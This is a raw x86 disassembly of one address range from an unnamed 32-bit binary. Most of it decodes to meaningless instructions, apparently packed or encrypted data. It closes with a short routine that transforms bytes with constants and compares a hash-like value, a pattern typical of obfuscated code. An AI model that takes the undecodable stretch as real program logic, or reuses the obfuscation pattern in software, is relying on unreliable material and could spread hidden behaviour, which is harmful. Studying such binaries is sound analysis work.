  41b035:	pushf  
  41b036:	dec    ebx
  41b037:	lock stos BYTE PTR es:[edi],al
  41b039:	popf   
  41b03a:	push   eax
  41b03b:	ror    DWORD PTR [edx],1
  41b03d:	push   ss
  41b03e:	xor    esi,DWORD PTR [ebx]
  41b040:	jl     0x41afcc
  41b042:	retf   0x1a60
  41b045:	jecxz  0x41b08e
  41b047:	fs dec edx
  41b049:	iret   
  41b04a:	add    DWORD PTR [esi+0x9],ebx
  41b04d:	xor    al,0x72
  41b04f:	dec    BYTE PTR [esi-0x62e003bd]
  41b055:	and    DWORD PTR ds:0xf8509a99,0xffffffdf
  41b05c:	cmc    
  41b05d:	pop    edx
  41b05e:	push   eax
  41b05f:	dec    ecx
  41b060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b061:	test   cl,0x4d
  41b064:	xor    DWORD PTR [ebx+0x37bf3da5],eax
  41b06a:	div    ch
  41b06c:	retf   0x5b68
  41b06f:	inc    edx
  41b070:	and    DWORD PTR [esi-0x708abb82],ecx
  41b076:	clc    
  41b077:	jbe    0x41b081
  41b079:	lods   eax,DWORD PTR ds:[esi]
  41b07a:	jge    0x41b0c8
  41b07c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b07e:	jmp    0x41b050
  41b080:	sbb    BYTE PTR [edx+0x4f],dh
  41b083:	mov    dl,0xe8
  41b085:	bound  ebx,QWORD PTR [ecx-0x5598541d]
  41b08b:	pop    es
  41b08c:	ds dec edx
  41b08e:	jnp    0x41b043
  41b090:	and    ch,BYTE PTR [edx]
  41b092:	mov    ds:0x12dc1220,al
  41b097:	mov    ds:0x58e5bc70,eax
  41b09c:	mov    cl,0xc2
  41b09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b09f:	mov    BYTE PTR [eax+0x43e3ca6f],bl
  41b0a5:	sbb    DWORD PTR [eax],edx
  41b0a7:	push   0x7730a502
  41b0ac:	test   esi,edx
  41b0ae:	cmp    ebx,ecx
  41b0b0:	mov    WORD PTR [edx],gs
  41b0b2:	arpl   WORD PTR [edx+0x56],sp
  41b0b5:	lock pop ss
  41b0b7:	add    al,0x98
  41b0b9:	(bad)
  41b0bd:	int3   
  41b0be:	pop    ds
  41b0bf:	xchg   ebp,eax
  41b0c0:	jmp    0x3f04:0x9ce24b79
  41b0c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0c8:	add    BYTE PTR [ebp+0x15333ee7],cl
  41b0ce:	dec    esi
  41b0cf:	fld    TBYTE PTR [ebp-0x39]
  41b0d2:	ja     0x41b0ba
  41b0d4:	mov    edx,0x6ed9e10e
  41b0d9:	jmp    0x1851324c
  41b0de:	fimul  DWORD PTR [edx+0x1f2014c2]
  41b0e4:	push   ds
  41b0e5:	pop    edi
  41b0e6:	je     0x41b0a0
  41b0e8:	sub    al,0x6b
  41b0ea:	pop    edx
  41b0eb:	or     edx,DWORD PTR [edi+0xf]
  41b0ee:	stc    
  41b0ef:	jnp    0x41b127
  41b0f1:	ret    0x9eb1
  41b0f4:	fcomp  QWORD PTR [ebx-0x43]
  41b0f7:	stc    
  41b0f8:	xchg   esp,eax
  41b0f9:	fnstsw WORD PTR [eax+0x61a23800]
  41b0ff:	push   0xb9f448f0
  41b104:	jno    0x41b0de
  41b106:	jnp    0x41b097
  41b108:	xlat   BYTE PTR ds:[ebx]
  41b109:	mov    ah,0xf9
  41b10b:	or     DWORD PTR [esi+0x173361f3],esi
  41b111:	outs   dx,BYTE PTR ds:[esi]
  41b112:	dec    ecx
  41b113:	or     ah,al
  41b115:	fstp   DWORD PTR [edi+eax*1]
  41b118:	xor    eax,0x24443902
  41b11d:	mov    al,ds:0xff1b149f
  41b122:	data16 xor BYTE PTR [ecx],ah
  41b125:	inc    eax
  41b126:	inc    ebx
  41b127:	push   0x596e119a
  41b12c:	xchg   ecx,eax
  41b12d:	mov    bl,0x8
  41b12f:	(bad)  
  41b130:	imul   ecx,DWORD PTR ds:0x15c46db6,0xffffff80
  41b137:	sub    DWORD PTR [edx],ebx
  41b139:	in     eax,0x1c
  41b13b:	pop    ebx
  41b13c:	adc    eax,0x7dfc3518
  41b141:	(bad)  
  41b142:	ds push 0x14
  41b145:	icebp  
  41b146:	cwde   
  41b147:	inc    ecx
  41b148:	mov    BYTE PTR [edi+0x48],ch
  41b14b:	push   esi
  41b14c:	pop    edi
  41b14d:	add    ch,al
  41b14f:	call   0x6c40bc97
  41b154:	in     eax,dx
  41b155:	adc    edx,esp
  41b157:	fnstcw WORD PTR [esi-0x2c9a563a]
  41b15d:	xchg   BYTE PTR [esi],al
  41b15f:	pushf  
  41b160:	int    0x4a
  41b162:	das    
  41b163:	jb     0x41b1ce
  41b165:	daa    
  41b166:	daa    
  41b167:	sbb    DWORD PTR [edi],ebx
  41b169:	jnp    0x41b187
  41b16b:	sbb    bh,BYTE PTR [edx-0x9]
  41b16e:	cdq    
  41b16f:	dec    ebx
  41b170:	in     eax,0xd9
  41b172:	fsub   QWORD PTR [ebx-0x18bdb94a]
  41b178:	retf   0xa39d
  41b17b:	mov    eax,DWORD PTR [edi]
  41b17d:	nop
  41b17e:	shl    DWORD PTR [esi-0x577d2fbd],cl
  41b184:	adc    eax,0x4baa082e
  41b189:	jge    0x41b1fc
  41b18b:	jmp    0xa430:0x2cc88948
  41b192:	ja     0x41b1ac
  41b194:	adc    DWORD PTR [eax+eiz*1+0x6e35f214],esi
  41b19b:	scas   al,BYTE PTR es:[edi]
  41b19c:	pop    edx
  41b19d:	pop    ds
  41b19e:	test   DWORD PTR [eax+0x25d1164a],0xb774f5f4
  41b1a8:	lock mov eax,ds:0xaf5e0441
  41b1ae:	dec    ebx
  41b1af:	into   
  41b1b0:	out    dx,eax
  41b1b1:	fwait
  41b1b2:	push   ebp
  41b1b3:	inc    esp
  41b1b4:	mov    ebp,0xbed4e71a
  41b1b9:	out    0x41,eax
  41b1bb:	mov    esi,0xbc9ac3e8
  41b1c0:	jge    0x41b233
  41b1c2:	popa   
  41b1c3:	aaa    
  41b1c4:	xor    ah,0xd7
  41b1c7:	inc    edx
  41b1c8:	popw   ds
  41b1ca:	pusha  
  41b1cb:	es push edx
  41b1cd:	outs   dx,DWORD PTR ds:[esi]
  41b1ce:	pusha  
  41b1cf:	js     0x41b19d
  41b1d1:	push   esi
  41b1d2:	dec    ebp
  41b1d3:	adc    eax,0x7b45f75b
  41b1d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1d9:	cmp    edi,DWORD PTR [esi-0x54962b5d]
  41b1df:	jecxz  0x41b239
  41b1e1:	or     edx,esp
  41b1e3:	ret    
  41b1e4:	push   edx
  41b1e5:	pop    esp
  41b1e6:	test   eax,0x3b05524e
  41b1eb:	dec    ecx
  41b1ec:	xor    ebx,0x37
  41b1ef:	cdq    
  41b1f0:	dec    ecx
  41b1f1:	cdq    
  41b1f2:	cmc    
  41b1f3:	or     bl,dl
  41b1f5:	and    DWORD PTR [esi],0x4a
  41b1f8:	push   esp
  41b1f9:	inc    eax
  41b1fa:	jecxz  0x41b225
  41b1fc:	frstor [ecx]
  41b1fe:	jp     0x41b200
  41b200:	or     al,0xf
  41b202:	add    DWORD PTR [edi],esi
  41b204:	mov    cs,WORD PTR ds:0x970f4a16
  41b20a:	data16 mov cl,0x91
  41b20d:	setge  cl
  41b210:	mov    esi,0x1a8cbfbe
  41b215:	(bad)  
  41b216:	cmp    ecx,DWORD PTR [ebx]
  41b218:	add    BYTE PTR [eax],cl
  41b21a:	mov    ch,BYTE PTR [edx+0x40]
  41b21d:	int3   
  41b21e:	in     eax,0x71
  41b220:	inc    ebp
  41b221:	mov    bh,0x95
  41b223:	lock bound eax,QWORD PTR [ecx+0x6e04adbc]
  41b22a:	pusha  
  41b22b:	and    eax,0x80e44e43
  41b230:	mov    dl,0x10
  41b232:	fistp  WORD PTR [eax-0xb1ff8f8]
  41b238:	fcomp  QWORD PTR [edi]
  41b23a:	jge    0x41b1d3
  41b23c:	add    al,0xe9
  41b23e:	test   BYTE PTR [esi-0x78],ah
  41b241:	test   BYTE PTR [esi+0x41],dh
  41b244:	cld    
  41b245:	and    BYTE PTR [eax+ebx*1],ch
  41b248:	xchg   BYTE PTR [ebx],ch
  41b24a:	hlt    
  41b24b:	mov    DWORD PTR [eax-0x77],esp
  41b24e:	(bad)  [ecx-0x5e]
  41b251:	mov    esi,0x5998cb9c
  41b256:	into   
  41b257:	sar    esi,0xf0
  41b25a:	xor    DWORD PTR [edx],ebp
  41b25c:	jbe    0x41b21a
  41b25e:	xchg   edx,eax
  41b25f:	stos   DWORD PTR es:[edi],eax
  41b260:	and    edx,ebp
  41b262:	mov    esi,0x68ffa702
  41b267:	xor    cl,ah
  41b269:	add    BYTE PTR [eax-0x4dbaae9c],al
  41b26f:	rcl    esp,cl
  41b271:	mov    bl,0x54
  41b273:	(bad)  
  41b274:	rcr    BYTE PTR [eax+eiz*4-0x454cd51a],1
  41b27b:	ficomp DWORD PTR [ebx+0x1da03d0f]
  41b281:	in     eax,dx
  41b282:	mov    dh,0xa6
  41b284:	rcr    BYTE PTR [esi],0x38
  41b287:	push   esp
  41b288:	adc    DWORD PTR [ecx],0xffffff8f
  41b28b:	daa    
  41b28c:	cli    
  41b28d:	jg     0x41b220
  41b28f:	int3   
  41b290:	pop    edi
  41b291:	out    dx,al
  41b292:	je     0x41b2bf
  41b294:	test   al,0x9
  41b296:	add    al,0x21
  41b298:	stos   BYTE PTR es:[edi],al
  41b299:	xor    ecx,ebx
  41b29b:	jmp    0xca61:0xd160398e
  41b2a2:	popa   
  41b2a3:	xor    ebp,DWORD PTR [ebx]
  41b2a5:	mov    ds:0x75335b1a,al
  41b2aa:	gs int3 
  41b2ac:	push   0x8af42788
  41b2b1:	xor    ecx,edx
  41b2b3:	mov    al,ds:0x285dec0d
  41b2b8:	vcvtps2dq xmm3,XMMWORD PTR cs:[edi-0x7152f370]
  41b2c1:	add    al,0xc4
  41b2c3:	xlat   BYTE PTR ds:[ebx]
  41b2c4:	and    ah,al
  41b2c6:	stc    
  41b2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2c8:	stos   DWORD PTR es:[edi],eax
  41b2c9:	in     eax,0x36
  41b2cb:	pushf  
  41b2cc:	mov    edi,0xbc6464ed
  41b2d1:	jmp    0x61c9ef79
  41b2d6:	add    eax,0x9ad4053e
  41b2db:	shl    DWORD PTR [ecx+eax*8+0x21],1
  41b2df:	fs repz push 0x5fbed1db
  41b2e6:	mov    ?,WORD PTR [eax]
  41b2e8:	mov    ecx,0x98159fde
  41b2ed:	sbb    eax,DWORD PTR [edx+esi*8]
  41b2f0:	aas    
  41b2f1:	fisub  DWORD PTR [eax+edx*4-0x35]
  41b2f5:	icebp  
  41b2f6:	ret    
  41b2f7:	sbb    eax,0x9837005e
  41b2fc:	jbe    0x41b29f
  41b2fe:	iret   
  41b2ff:	xchg   ebx,eax
  41b300:	popw   ss
  41b302:	popa   
  41b303:	cdq    
  41b304:	loopne 0x41b33c
  41b306:	(bad)  
  41b307:	push   ds
  41b308:	mov    bh,0x71
  41b30a:	fwait
  41b30b:	push   ecx
  41b30c:	sbb    eax,0x3a3489ff
  41b311:	jl     0x41b391
  41b313:	jns    0x41b2a0
  41b315:	mov    ds:0x1dbd9ed0,eax
  41b31a:	and    BYTE PTR [edx-0x40],0x8b
  41b31e:	lea    eax,[edi]
  41b320:	and    eax,0x728aa07a
  41b325:	scas   al,BYTE PTR es:[edi]
  41b326:	pop    edx
  41b327:	sub    esi,DWORD PTR [edx+0x16]
  41b32a:	retf   0xf8a3
  41b32d:	add    esi,esi
  41b32f:	nop
  41b330:	mov    eax,0x89a54e2f
  41b335:	mov    BYTE PTR [edx],dl
  41b337:	lock push edx
  41b339:	(bad)
  41b33d:	adc    al,0xa4
  41b33f:	add    al,0xb8
  41b341:	mov    edx,0x77200f99
  41b346:	or     BYTE PTR [edi-0x22a8440d],ch
  41b34c:	xchg   esp,eax
  41b34d:	mov    dh,0xf2
  41b34f:	or     BYTE PTR [esi+0x2d],al
  41b352:	sar    DWORD PTR [edi],1
  41b354:	jo     0x41b33a
  41b356:	xor    ch,BYTE PTR [ebp+0x74]
  41b359:	dec    eax
  41b35a:	sbb    eax,0x9bf83a42
  41b35f:	jbe    0x41b2ef
  41b361:	mov    edi,0xd6c97c0c
  41b366:	pop    ebx
  41b367:	pop    esi
  41b368:	mov    ch,0x8d
  41b36a:	or     eax,DWORD PTR [eax+edi*2+0x5bdb8955]
  41b371:	xor    BYTE PTR [ebx],bh
  41b373:	inc    edx
  41b374:	call   DWORD PTR [eax+0x12559650]
  41b37a:	out    0x34,al
  41b37c:	add    BYTE PTR [esi+0x76],bl
  41b37f:	add    eax,0x64857fa5
  41b384:	or     al,0x49
  41b386:	or     cl,BYTE PTR [ecx-0x6c4ca2e9]
  41b38c:	xchg   ecx,eax
  41b38d:	mov    edi,edx
  41b38f:	clc    
  41b390:	mov    ds:0x9f2b1b7d,eax
  41b395:	scas   eax,DWORD PTR es:[edi]
  41b396:	cld    
  41b397:	or     al,0x1b
  41b399:	shl    DWORD PTR [edi-0xe4e4c48],1
  41b39f:	mov    al,ds:0x4deff683
  41b3a4:	mov    cl,0x26
  41b3a6:	mov    bh,0x3f
  41b3a8:	mov    ch,0x47
  41b3aa:	pop    eax
  41b3ab:	adc    edi,DWORD PTR ds:0xc29de96a
  41b3b1:	pop    ecx
  41b3b2:	out    0xa2,al
  41b3b4:	mov    BYTE PTR [ecx-0x7f6aa218],ch
  41b3ba:	mov    ss,WORD PTR [edi]
  41b3bc:	push   0xbb9161c7
  41b3c1:	sbb    ebx,ebx
  41b3c3:	push   esi
  41b3c4:	xchg   ebp,eax
  41b3c5:	mul    BYTE PTR [eax+eiz*2]
  41b3c8:	push   cs
  41b3c9:	(bad)  
  41b3ca:	rcr    DWORD PTR [edx-0x23],cl
  41b3cd:	xchg   DWORD PTR [edx+0x699daa11],esi
  41b3d3:	(bad)  
  41b3d5:	dec    ebx
  41b3d6:	lods   eax,DWORD PTR ds:[esi]
  41b3d7:	lods   eax,DWORD PTR ds:[esi]
  41b3d8:	mov    al,0x39
  41b3da:	inc    esp
  41b3db:	shl    DWORD PTR ds:0xa78ef2fa,1
  41b3e1:	int    0x8a
  41b3e3:	cmp    eax,ebx
  41b3e5:	adc    al,0x67
  41b3e7:	pop    esp
  41b3e8:	push   esi
  41b3e9:	mov    bh,0x35
  41b3eb:	mov    edx,0x4a705391
  41b3f0:	imul   ebp,DWORD PTR [ecx+0x1dec0511],0xffffff96
  41b3f7:	(bad)  
  41b3f8:	retf   0xcb6b
  41b3fb:	xor    al,0x45
  41b3fd:	cs test al,0x4d
  41b400:	jmp    0x41b3fc
  41b402:	mul    DWORD PTR [edi]
  41b404:	pop    esi
  41b405:	or     ebp,DWORD PTR [esi-0x59]
  41b408:	mov    edx,0x27c06f9b
  41b40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b40e:	bound  esi,QWORD PTR [esi+edi*2-0x4a]
  41b412:	sahf   
  41b413:	cmp    DWORD PTR [edx+0xd93ebe5],ebp
  41b419:	mov    eax,ds:0x92f7ce77
  41b41e:	rcl    DWORD PTR [ebx+0x9aead12],cl
  41b424:	xor    BYTE PTR [edx],dh
  41b426:	push   es
  41b427:	xchg   ecx,eax
  41b428:	je     0x41b3aa
  41b42a:	or     BYTE PTR [edi+0x29],0xaa
  41b42e:	mov    ds:0xc9da025f,al
  41b433:	mov    edx,0x39747331
  41b438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b439:	mov    ecx,0xabb2bd9e
  41b43e:	shr    DWORD PTR [eax-0xb],0x7c
  41b442:	xor    BYTE PTR [edi+0x15aa989e],cl
  41b448:	or     DWORD PTR [esi],ecx
  41b44a:	pop    ebp
  41b44b:	adc    BYTE PTR [ebx+0x74],0x9a
  41b44f:	pop    edx
  41b450:	xchg   ecx,eax
  41b451:	enter  0x9e39,0x5d
  41b455:	inc    ecx
  41b456:	push   eax
  41b457:	arpl   WORD PTR [esi+0x14],sp
  41b45a:	lahf   
  41b45b:	pop    ebx
  41b45c:	cdq    
  41b45d:	test   BYTE PTR [eax],al
  41b45f:	xor    al,0xe5
  41b461:	mov    edi,0x66fd0d20
  41b466:	sbb    eax,0x765110a8
  41b46b:	pop    ebx
  41b46c:	jnp    0x41b4af
  41b46e:	push   ebx
  41b46f:	add    dh,BYTE PTR [edx-0x44]
  41b472:	mov    ecx,0x7098f388
  41b477:	cs pusha 
  41b479:	xor    edi,DWORD PTR [eax]
  41b47b:	add    eax,esi
  41b47d:	call   0xd846:0x4ce874af
  41b484:	dec    esp
  41b485:	daa    
  41b486:	and    esi,edx
  41b488:	(bad)  
  41b489:	xchg   esi,eax
  41b48a:	sbb    BYTE PTR [ebp-0x7c],cl
  41b48d:	mov    ds:0x667fb2bf,eax
  41b492:	push   ebp
  41b493:	and    edx,DWORD PTR [esi+esi*4-0x57d00c12]
  41b49a:	inc    ecx
  41b49b:	mov    ss,WORD PTR [edx]
  41b49d:	or     DWORD PTR [ebx+0x33448c6f],esp
  41b4a3:	mov    WORD PTR [esi],?
  41b4a5:	jb     0x41b519
  41b4a7:	shl    eax,cl
  41b4a9:	xor    al,0xd4
  41b4ab:	je     0x41b43f
  41b4ad:	jb     0x41b52a
  41b4af:	cs shl ah,1
  41b4b2:	mov    edi,0x509b56fc
  41b4b7:	and    al,0xaa
  41b4b9:	inc    eax
  41b4ba:	sti    
  41b4bb:	xor    DWORD PTR [ecx+0x56],eax
  41b4be:	dec    eax
  41b4bf:	and    ch,dl
  41b4c1:	in     al,dx
  41b4c2:	adc    BYTE PTR [ebx],cl
  41b4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4c5:	retf   0x39e9
  41b4c8:	cs jbe 0x41b500
  41b4cb:	add    al,0x50
  41b4cd:	iret   
  41b4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4cf:	jns    0x41b4f7
  41b4d1:	push   ebx
  41b4d2:	add    al,0xfa
  41b4d4:	mov    dl,0x66
  41b4d6:	pushf  
  41b4d7:	adc    al,0xd4
  41b4d9:	stos   DWORD PTR es:[edi],eax
  41b4da:	dec    ecx
  41b4db:	or     cl,ah
  41b4dd:	jb     0x41b52e
  41b4df:	or     al,0x2c
  41b4e1:	stc    
  41b4e2:	jae    0x41b4bd
  41b4e4:	cmc    
  41b4e5:	out    0x15,eax
  41b4e7:	inc    ebp
  41b4e8:	(bad)  
  41b4e9:	scas   al,BYTE PTR es:[edi]
  41b4ea:	stc    
  41b4eb:	pop    es
  41b4ec:	ja     0x41b554
  41b4ee:	push   eax
  41b4ef:	popa   
  41b4f0:	mov    ds:0xb1e464aa,eax
  41b4f5:	add    BYTE PTR [esi],ch
  41b4f7:	add    ah,cl
  41b4f9:	and    al,0xe5
  41b4fb:	cmp    DWORD PTR [esi-0x1a],esp
  41b4fe:	mov    dl,0xae
  41b500:	sbb    bh,BYTE PTR [eax+0x25]
  41b503:	jbe    0x41b4bf
  41b505:	dec    ebx
  41b506:	add    BYTE PTR [edi+0x7ba7ad9b],dl
  41b50c:	lods   al,BYTE PTR ds:[esi]
  41b50d:	sub    BYTE PTR [ecx],dl
  41b50f:	mov    DWORD PTR [esi+0x4a],eax
  41b512:	das    
  41b513:	or     al,0x42
  41b515:	cwde   
  41b516:	inc    ecx
  41b517:	push   ebx
  41b518:	lods   al,BYTE PTR ds:[esi]
  41b519:	loope  0x41b531
  41b51b:	test   eax,0x4dfff87f
  41b520:	mov    al,ds:0xd4d5fcff
  41b525:	cs jmp 0x41b4cb
  41b528:	loopne 0x41b53e
  41b52a:	inc    ecx
  41b52b:	push   es
  41b52c:	fisub  WORD PTR ds:0x90826fde
  41b532:	inc    esp
  41b533:	inc    ebx
  41b534:	retf   0xb251
  41b537:	test   al,0xd0
  41b539:	mov    edx,0xa3c6857e
  41b53e:	mov    dh,0xd4
  41b540:	push   ds
  41b541:	xchg   ebx,eax
  41b542:	or     al,0x3c
  41b544:	scas   eax,DWORD PTR es:[edi]
  41b545:	out    0xd7,eax
  41b547:	add    al,0xfb
  41b549:	add    edi,DWORD PTR [eax]
  41b54b:	sub    edx,DWORD PTR [edx-0x16]
  41b54e:	push   ecx
  41b54f:	nop
  41b550:	test   eax,0xf42d1e4d
  41b555:	enter  0x3e2,0xba
  41b559:	jmp    0x189:0x519db5cd
  41b560:	ins    DWORD PTR es:[edi],dx
  41b561:	into   
  41b562:	xchg   edx,eax
  41b563:	mov    dl,0x13
  41b565:	loop   0x41b536
  41b567:	sub    BYTE PTR [ecx],ah
  41b569:	sahf   
  41b56a:	fnstenv [ecx-0x1e]
  41b56d:	stos   BYTE PTR es:[edi],al
  41b56e:	or     DWORD PTR [edx],ecx
  41b570:	adc    eax,0xd861fa7e
  41b575:	je     0x41b560
  41b577:	pop    ss
  41b578:	lods   al,BYTE PTR ds:[esi]
  41b579:	sub    dh,BYTE PTR [ecx]
  41b57b:	test   DWORD PTR [ecx-0x7f7bdbe7],edi
  41b581:	mov    dl,al
  41b583:	push   edx
  41b584:	sub    eax,0x8e3d056f
  41b589:	adc    al,0xb9
  41b58b:	add    bh,BYTE PTR [edx-0x23]
  41b58e:	sub    BYTE PTR [edi],0x44
  41b591:	jb     0x41b5e8
  41b593:	int    0xdf
  41b595:	push   es
  41b596:	adc    al,0xd8
  41b598:	add    al,0x8d
  41b59a:	adc    ecx,esi
  41b59c:	aaa    
  41b59d:	dec    edx
  41b59e:	cmc    
  41b59f:	adc    BYTE PTR [ebx],ah
  41b5a1:	(bad)  
  41b5a2:	mov    ecx,0x2eb4f18e
  41b5a7:	add    BYTE PTR [edx+eax*4-0x25],bh
  41b5ab:	pop    ebp
  41b5ac:	cmp    al,0x7e
  41b5ae:	fcompp 
  41b5b0:	mov    eax,0xd7af80eb
  41b5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5b6:	xchg   ebx,eax
  41b5b7:	test   al,0x22
  41b5b9:	cmp    BYTE PTR [ebp+ebp*1+0x45],cl
  41b5bd:	inc    DWORD PTR [esp-0x22be333a]
  41b5c4:	add    bl,0xef
  41b5c7:	sub    DWORD PTR [edi],ecx
  41b5c9:	sub    cl,BYTE PTR [edi+0x6123c959]
  41b5cf:	(bad)  
  41b5d0:	fild   QWORD PTR [ecx-0x35]
  41b5d3:	in     al,dx
  41b5d4:	adc    DWORD PTR [edi],eax
  41b5d6:	test   BYTE PTR [ebx],bl
  41b5d8:	sub    edx,DWORD PTR [edx+edx*4]
  41b5db:	sub    eax,0x285f6d53
  41b5e0:	sbb    DWORD PTR [ebx],0x7fc81d55
  41b5e6:	(bad)  
  41b5e7:	xlat   BYTE PTR ds:[ebx]
  41b5e8:	push   esp
  41b5e9:	push   eax
  41b5ea:	jp     0x41b5a8
  41b5ec:	mov    esi,0x6b4b7495
  41b5f1:	ficomp WORD PTR [edx+esi*1+0x41656d62]
  41b5f8:	and    cl,0x13
  41b5fb:	js     0x41b639
  41b5fd:	sub    edx,DWORD PTR [esp+eax*2]
  41b600:	fist   WORD PTR [ecx+0x4a8c05b9]
  41b606:	fdiv   DWORD PTR [eax]
  41b608:	ret    0xa2c3
  41b60b:	ret    0x17bd
  41b60e:	push   edi
  41b60f:	xor    BYTE PTR [ecx-0x2f],bl
  41b612:	popf   
  41b613:	dec    ebx
  41b614:	ins    BYTE PTR es:[edi],dx
  41b615:	inc    edi
  41b616:	(bad)  
  41b618:	gs mov edi,0xa7933be4
  41b61e:	dec    ecx
  41b61f:	dec    eax
  41b620:	xchg   ebp,eax
  41b621:	sbb    BYTE PTR [edx+0x7e],0xc7
  41b625:	sbb    DWORD PTR [ecx],ebp
  41b627:	iret   
  41b628:	stc    
  41b629:	add    al,0x9
  41b62b:	imul   edx,DWORD PTR [ebx+0x68],0xb620fdbb
  41b632:	scas   eax,DWORD PTR es:[edi]
  41b633:	mov    bl,0xf2
  41b635:	fidiv  WORD PTR [edi]
  41b637:	nop
  41b638:	iret   
  41b639:	mov    ds,WORD PTR [ebx-0x29]
  41b63c:	sub    edx,DWORD PTR [edi+0x41444fa6]
  41b642:	mov    DWORD PTR [ecx],ecx
  41b644:	push   esp
  41b645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b646:	into   
  41b647:	mov    al,BYTE PTR [ecx*4-0x2ae7f8a8]
  41b64e:	xor    eax,0x41be6cb7
  41b653:	or     DWORD PTR [edx+0xa254a47],0x3a
  41b65a:	test   esi,edi
  41b65c:	ja     0x41b69e
  41b65e:	xchg   dh,dh
  41b660:	loope  0x41b641
  41b662:	rol    DWORD PTR [edi],cl
  41b664:	inc    ebp
  41b665:	and    edi,0x341b4fc4
  41b66b:	into   
  41b66c:	jae    0x41b6cf
  41b66e:	and    BYTE PTR [esi],ah
  41b670:	stos   BYTE PTR es:[edi],al
  41b671:	aad    0x7
  41b673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b674:	adc    BYTE PTR [edx],dh
  41b676:	xchg   DWORD PTR [eiz*2+0x2a00c75d],edx
  41b67d:	or     al,BYTE PTR [edi]
  41b67f:	xchg   ebx,eax
  41b680:	inc    ecx
  41b681:	xlat   BYTE PTR ds:[ebx]
  41b682:	mov    ds:0xa2b64f4b,eax
  41b687:	mov    eax,0xee27aafc
  41b68d:	fist   WORD PTR [esi+0x69]
  41b690:	pop    ss
  41b691:	pushf  
  41b692:	neg    DWORD PTR [eax-0x76]
  41b695:	mov    ch,0x47
  41b697:	(bad)
  41b69b:	xchg   ecx,eax
  41b69c:	xchg   esp,eax
  41b69d:	push   ds
  41b69e:	dec    edi
  41b69f:	mov    al,ds:0xc87a442f
  41b6a4:	ret    0xa88
  41b6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6a8:	leave  
  41b6a9:	sbb    al,BYTE PTR [ecx+ecx*1+0x6b]
  41b6ad:	add    eax,0x9434931f
  41b6b2:	lods   eax,DWORD PTR ds:[esi]
  41b6b3:	(bad)  
  41b6b4:	jno    0x41b69e
  41b6b6:	dec    ebp
  41b6b7:	sahf   
  41b6b8:	repnz pop es
  41b6ba:	out    0xd2,eax
  41b6bc:	cs push edx
  41b6be:	aad    0x41
  41b6c0:	pop    es
  41b6c1:	inc    esp
  41b6c2:	jb     0x41b6b3
  41b6c4:	mov    bl,0x23
  41b6c6:	and    ebx,DWORD PTR [ebp+0x70de8a65]
  41b6cc:	repnz repz push ds
  41b6cf:	mov    edi,0xd8c29e10
  41b6d4:	fimul  WORD PTR [eax]
  41b6d6:	and    DWORD PTR [esi+0x437c7890],edx
  41b6dc:	lea    ebp,[edi-0xacea422]
  41b6e2:	(bad)
  41b6e7:	xor    dl,bh
  41b6e9:	sbb    BYTE PTR [ebx+0x20],dl
  41b6ec:	ss mov al,0xb9
  41b6ef:	aas    
  41b6f0:	lods   al,BYTE PTR ds:[esi]
  41b6f1:	jmp    0x3b12:0xa1c85684
  41b6f8:	xor    esp,edi
  41b6fa:	out    dx,eax
  41b6fb:	push   ebp
  41b6fc:	jmp    0x41b732
  41b6fe:	cmp    al,0xa4
  41b700:	ss xor eax,esi
  41b703:	lock js 0x41b6be
  41b706:	test   BYTE PTR [ebp+0x7c],0xdc
  41b70a:	or     al,0x3d
  41b70c:	mov    al,0xde
  41b70e:	shl    DWORD PTR [ebp+0x1c7910d8],1
  41b714:	jl     0x41b756
  41b716:	mov    ch,0x97
  41b718:	mov    ch,BYTE PTR [esi-0x23]
  41b71b:	or     DWORD PTR [ecx+0x34],0xffffffaa
  41b71f:	das    
  41b720:	add    ebx,edi
  41b722:	fmul   QWORD PTR [edi]
  41b724:	mov    dl,0x55
  41b726:	dec    esp
  41b727:	scas   al,BYTE PTR es:[edi]
  41b728:	fistp  DWORD PTR [edi]
  41b72a:	dec    edx
  41b72b:	xchg   ebx,eax
  41b72c:	std    
  41b72d:	and    DWORD PTR [edi+0x8],0x66219ee6
  41b734:	mov    ebp,0xeb369ca1
  41b739:	ja     0x41b6c0
  41b73b:	mov    DWORD PTR [ebp-0x14],ecx
  41b73e:	mov    ecx,DWORD PTR [ebp-0x14]
  41b741:	mov    ecx,DWORD PTR [ecx+0xc]
  41b744:	movsx  cx,BYTE PTR [ecx+eax*1]
  41b749:	mov    edx,0x3b4b
  41b74e:	sub    cx,dx
  41b751:	mov    edx,0x8a85
  41b756:	xor    cx,dx
  41b759:	mov    edx,0x4f85
  41b75e:	cmp    cx,dx
  41b761:	jne    0x419376
  41b767:	mov    ecx,DWORD PTR ds:0x42400a
  41b76d:	mov    ecx,DWORD PTR [ecx+0x198]
  41b773:	mov    DWORD PTR [ecx],eax
  41b775:	jmp    0x41b79b
  41b77a:	mov    ecx,DWORD PTR [ebp+0x18]
  41b77d:	cmp    ecx,0xf89c85b5
  41b783:	jne    0x41b79b
  41b789:	push   eax
  41b78a:	push   DWORD PTR [ebp+0x14]
  41b78d:	push   DWORD PTR [ebp+0x10]
  41b790:	push   DWORD PTR [ebp+0xc]
  41b793:	push   DWORD PTR [ebp+0x8]
  41b796:	call   0x416ab7
  41b79b:	pop    edi
  41b79c:	pop    esi
  41b79d:	leave  
  41b79e:	ret    0x14
  41b7a1:	push   ebp
  41b7a2:	mov    ebp,esp
  41b7a4:	sub    esp,0x48
  41b7a7:	push   ebx
  41b7a8:	movzx  eax,BYTE PTR ds:0x42901c
  41b7af:	sub    DWORD PTR ds:0x429010,eax
  41b7b5:	push   esi
  41b7b6:	adc    DWORD PTR ds:0x429000,0x3a05
  41b7c0:	push   edi
  41b7c1:	xor    edi,0x559a
  41b7c7:	xor    esi,esi
